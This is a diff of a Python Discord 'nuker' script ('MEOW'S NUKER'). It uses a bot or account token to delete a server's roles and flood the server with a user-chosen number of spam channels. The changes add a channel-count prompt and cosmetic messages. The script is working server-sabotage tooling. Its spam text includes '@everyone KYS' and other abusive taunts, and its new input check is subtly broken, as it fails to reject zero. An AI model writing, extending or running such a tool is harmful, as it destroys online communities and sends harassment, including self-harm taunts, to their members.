@@ -16,7 +16,7 @@ from time import sleep
 colorama.init()
 
 print(Fore.LIGHTBLUE_EX + rf'''
-NEW UPDATE: Automatically identifies if a token is a bot token or a user account token.
+Version 0.2
 
 meow   __  __ _____ _____        ___ ____      _   _ _   _ _  _______ ____    meow
 meow  |  \/  | ____/ _ \ \      / ( ) ___|    | \ | | | | | |/ / ____|  _ \   meow
@@ -88,10 +88,24 @@ def vtoken(token):
             print(Fore.YELLOW + "[*] Token Successfully Identified: Bot")
 
             prefix = input(Fore.LIGHTBLUE_EX + "[?] Enter bot prefix: ")
-            print(Fore.YELLOW + f"[*] Prefix successfully set, {prefix}meow to start the nuker!")
+            print(Fore.YELLOW + f"[*] Prefix successfully set, {prefix}meow to start the nuker.")
 
-            nick = input(Fore.LIGHTBLUE_EX + "[?] what is your internet nickname (NUKED BY {nickname}): ")
+            nick = input(Fore.LIGHTBLUE_EX + "[?] What is your internet nickname (NUKED BY {nickname}): ")
 
+            while True:
+                try:
+
+                    amount = int(input(Fore.LIGHTBLUE_EX + "[?] Channel Amount (how many channels you'd like to create): "))
+                except ValueError or amount == 0:
+                    print(Fore.RED + "[-] Invalid input! It has to be a number/cannot be 0.")
+
+                    continue
+                else:
+
+                    break
+
+
+            nick = nick.upper()
             SPAM_CHANNEL = f"nuked by {nick}"
             SPAM_MESSAGE = f"@everyone NUKED BY {nick}", "@everyone KYS", f"@everyone {nick} BEAMED THIS BOT", "@everyone gf = getfucked"
 
@@ -102,6 +116,7 @@ def vtoken(token):
             async def on_ready():
                 await bot.change_presence(activity=discord.Game(name="MEOW'S NUKER"))
                 print("[+] Logged in as " + bot.user.name)
+                print(Fore.YELLOW + f"[*] Waiting for command... ({prefix}meow)")
 
 
             @bot.command()
@@ -129,12 +144,12 @@ def vtoken(token):
                     except:
                         print(Fore.RED + f"[-] Couldn't delete {role.name}" + Fore.RESET)
 
-                await guild.create_text_channel(SPAM_CHANNEL)
 
-                amount = 200
+
+
                 for i in range(amount):
                     await guild.create_text_channel(SPAM_CHANNEL)
-                print(Fore.YELLOW + "[+] {guild.name} has been nuked!")
+                print(Fore.YELLOW + f"[*] {guild.name} has been nuked!")
                 return
 
 
@@ -261,4 +276,3 @@ def vtoken(token):
         nuke(token=token, Server_Name=Server_Name, message_Content=message_Content)
 
 vtoken(token)
-
